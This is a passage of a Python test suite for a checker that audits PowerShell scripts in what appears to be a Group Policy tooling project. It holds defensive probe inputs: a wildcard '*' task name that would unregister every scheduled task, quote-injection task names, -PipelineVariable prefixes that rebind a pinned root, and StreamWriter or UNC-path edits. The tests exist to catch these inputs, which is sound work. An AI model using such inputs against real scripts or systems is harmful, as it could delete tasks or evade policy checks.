    printer = (_REPO / "scripts" / "print_statement_digests.py").read_text(encoding="utf-8")
    for token in ("write_text", "write_bytes", ".write("):
        assert token not in printer, f"print helper must not write ({token})"
    assert "print_statement_digests" not in generator
    source = inspect.getsource(write_golden_inventory)
    assert source.count("write_text") == 1 and "GOLDEN_PATH.write_text(" in source
    for token in ("write_bytes", "open("):
        assert token not in source
    guarded = sorted((_REPO / "tests").rglob("*.py")) + sorted((_REPO / "scripts").glob("*"))
    before = {p: p.read_bytes() for p in guarded if p.is_file()}
    monkeypatch.setitem(globals(), "GOLDEN_PATH", tmp_path / "collector-inventory.json")
    write_golden_inventory(_pwsh())
    assert (tmp_path / "collector-inventory.json").is_file()
    assert {p: p.read_bytes() for p in before} == before, "generator modified a tracked file"


# Letters outside quoted strings are re-cased; string contents are data and stay.
def _random_case(text: str, seed: str) -> str:
    # Deterministic per-character coin from the seed (reproducible, no RNG state).
    bits = hashlib.sha256(seed.encode()).digest() * (len(text) // 256 + 1)
    out: list[str] = []
    quote: str | None = None
    for i, ch in enumerate(text):
        if quote:
            out.append(ch)
            if ch == quote:
                quote = None
            continue
        if ch in "'\"":
            quote = ch
            out.append(ch)
            continue
        flip = (bits[i // 8] >> (i % 8)) & 1
        out.append(ch.upper() if ch.isalpha() and flip else ch.lower())
    return "".join(out)


def _random_case_edit(mode: str, edit: str | tuple[str, str], seed: str) -> str | tuple[str, str]:
    if isinstance(edit, str):
        return _random_case(edit, seed)
    anchor, change = edit
    return (anchor, _random_case(change, seed))


def test_regression_verdicts_are_case_insensitive(tmp_path: Path) -> None:
    """Cross-repo class (adcs-lens `_WRITEJSON` vs `_writeJson`): PowerShell
    resolves commands, functions, parameters, members, types and variables
    case-insensitively, so every regression probe re-cased at random must get
    the same verdict — flagged by its intended check, not by a parse error."""
    exe = _pwsh()
    base_inv = _inventory_for(exe)
    files: list[Path] = []
    for probe_id, base, position, snippet in _REGRESSIONS:
        text = (_SCRIPTS / base).read_text(encoding="utf-8")
        mutated = _apply_edit(text, position, _random_case_edit(position, snippet, probe_id))
        target = tmp_path / probe_id / base
        target.parent.mkdir()
        target.write_bytes(mutated.encode("utf-8"))
        files.append(target)
    results = [
        _canonicalize(e) for e in _run_dumper_raw(exe, [str(f) for f in files], timeout=2400)
    ]
    wrong: list[str] = []
    for (probe_id, base, _position, _snippet), entry in zip(_REGRESSIONS, results, strict=True):
        assert Path(entry["path"]).parent.name == probe_id
        inv = dict(base_inv)
        inv[base] = entry
        failed = _run_checks(base, inv)
        expected = _PROBE_EXPECTED_CHECK[probe_id]
        if expected not in failed or ("parse" in failed and "using" not in probe_id):
            wrong.append(f"{probe_id}: expected {expected!r}, raised {sorted(failed)}")
    assert not wrong, "re-cased probes changed verdict:\n" + "\n".join(wrong)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_local_function_bodies_are_pinned(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_local_function_bodies(script, inventory[script])


@pytest.mark.parametrize("name", ["*", "Gpo*", "GpoLens?", "[A-Z]*", "a\\b", "x'y", " lead"])
def test_task_name_wildcards_are_refused_before_unregister(tmp_path: Path, name: str) -> None:
    """Sol round 5 (B2): `-TaskName '*' -Unregister` reached Unregister-
    ScheduledTask and removed every matching task. The shared TaskName
    validator now refuses wildcard/path/quote characters at parameter binding,
    before ShouldProcess or the cmdlet runs (stubbed here; a valid name is the
    positive control)."""
    probe = tmp_path / "unregister.ps1"
    script = _SCRIPTS / "Register-GpoLensCollection.ps1"
    probe.write_text(
        "function Unregister-ScheduledTask { param([string]$TaskName, [switch]$Confirm)\n"
        '  "STUB_UNREGISTER <$TaskName>" }\n'
        "$Name = $args[0]\n"
        f"try {{ & '{script}' -Unregister -TaskName $Name -Confirm:$false }}\n"
        "catch { 'REFUSED ' + $_.FullyQualifiedErrorId }\n"
        f"& '{script}' -Unregister -TaskName 'GpoLensCollection' -Confirm:$false\n",
        encoding="utf-8",
    )
    result = subprocess.run(
        [_pwsh(), "-NoProfile", "-NonInteractive", "-File", str(probe), name],
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    out = result.stdout
    assert "REFUSED ParameterArgumentValidationError" in out, out + result.stderr
    assert f"STUB_UNREGISTER <{name}>" not in out
    assert "STUB_UNREGISTER <GpoLensCollection>" in out  # positive control


# Aliases of the variable-writing common parameters (PowerShell's own).
_VARIABLE_PARAM_ALIASES = {
    "outvariable": "ov",
    "pipelinevariable": "pv",
    "errorvariable": "ev",
    "warningvariable": "wv",
    "informationvariable": "iv",
}


def test_variable_param_prefixes_and_aliases_are_resolved(tmp_path: Path) -> None:
    """DeepSeek round 5 (BL-1): `-Pi` is the unambiguous 2-char prefix of
    -PipelineVariable. The dumper resolves every parameter token the way
    PowerShell does, so the full name, each alias, and every unambiguous prefix
    of a variable-writing common parameter must all be caught rebinding a pinned
    root. Each token is run through the real dumper (its resolver is pwsh's)."""
    exe = _pwsh()
    base = (_SCRIPTS / "Export-GpoEstate.ps1").read_text(encoding="utf-8")
    forms: dict[str, tuple[str, str]] = {}  # label -> (token, expected canonical)
    for name in _VARIABLE_WRITING_PARAMS:
        canon = name.casefold()
        forms[f"{name}:full"] = (name, canon)
        forms[f"{name}:alias"] = (_VARIABLE_PARAM_ALIASES[canon], canon)
        for i in range(2, len(name) + 1):  # prefixes; the dumper reports which resolve
            forms[f"{name}:pre{i}"] = (name[:i], canon)
    files: list[Path] = []
    labels = list(forms)
    for label in labels:
        token, _canon = forms[label]
        target = tmp_path / f"{label.replace(':', '_')}.ps1"
        target.write_text(
            base + f"\nGet-Item -LiteralPath '/etc/hostname' -{token} OutputRoot | Out-Null\n",
            encoding="utf-8",
        )
        files.append(target)
    results = [
        _canonicalize(e) for e in _run_dumper_raw(exe, [str(f) for f in files], timeout=2400)
    ]
    caught_pi_prefix = False
    for label, entry in zip(labels, results, strict=True):
        token, expected = forms[label]
        appended = next(
            c
            for c in reversed(entry["commands"])
            if any(_norm(a["value"]) == "'/etc/hostname'" for a in c["arguments"])
        )
        arg = next(
            a for a in appended["arguments"] if a["parameter"] and _norm(a["value"]) == "OutputRoot"
        )
        canon = arg.get("parameter_canonical")
        if canon != expected:
            continue  # this prefix is ambiguous on Get-Item; PowerShell would not bind it either
        inv = dict(_inventory_for(exe))
        inv["Export-GpoEstate.ps1"] = entry
        failed = _run_checks("Export-GpoEstate.ps1", inv)
        assert "pinned_bindings" in failed, (
            f"{label} (-{token} -> {canon}) was not rejected: {sorted(failed)}"
        )
        if token.casefold() == "pi":
            caught_pi_prefix = True
    assert caught_pi_prefix, "the 2-char prefix -Pi of -PipelineVariable was not exercised"


# Sol round 8: the structural STATEMENT_DIGESTS table forces a human edit, but
# the floor must still refuse a harmful edit even once the digest is updated.
_POST_DIGEST_FLOOR_PROBES = [
    "r8s_implicit_streamwriter",
    "r8s_implicit_streamreader_unc",
    "r8s_fileinfo_length_unc",
    "r8s_directoryinfo_exists_unc",
    "r9d_as_streamwriter",
    "r9d_as_streamreader_unc",
    "r9d_as_computed_type",
    "r9s_as_streamwriter_unc",
]


@pytest.mark.parametrize("probe_id", _POST_DIGEST_FLOOR_PROBES)
def test_floor_refuses_after_statement_digest_update(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, probe_id: str
) -> None:
    """Replay Sol's probe in post-digest-update form: regenerate the candidate's
    STATEMENT_DIGESTS entry (as a human would), then the semantic floor must
    still reject it and the generator must still refuse to write the golden."""
    probe = next(p for p in _REGRESSIONS if p[0] == probe_id)
    _, base, position, snippet = probe
    exe = _pwsh()
    inv = _modified_inventory(exe, base, position, snippet, tmp_path)
    # A human updates the structural table to match the edit.
    updated = _statement_digests(inv[base])
    monkeypatch.setitem(STATEMENT_DIGESTS, base, updated)
    failed = _run_checks(base, inv)
    assert "statement_digests" not in failed, f"{probe_id}: digest update did not take"
    expected = _PROBE_EXPECTED_CHECK[probe_id]
    assert expected in failed, f"{probe_id}: floor did not refuse post-update: {sorted(failed)}"
    # And the generator refuses to regenerate the golden for it.
    with pytest.raises(AssertionError):
        run_all_checks(base, inv)


def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
    for script in POLICIES:
        run_all_checks(script, inventory)
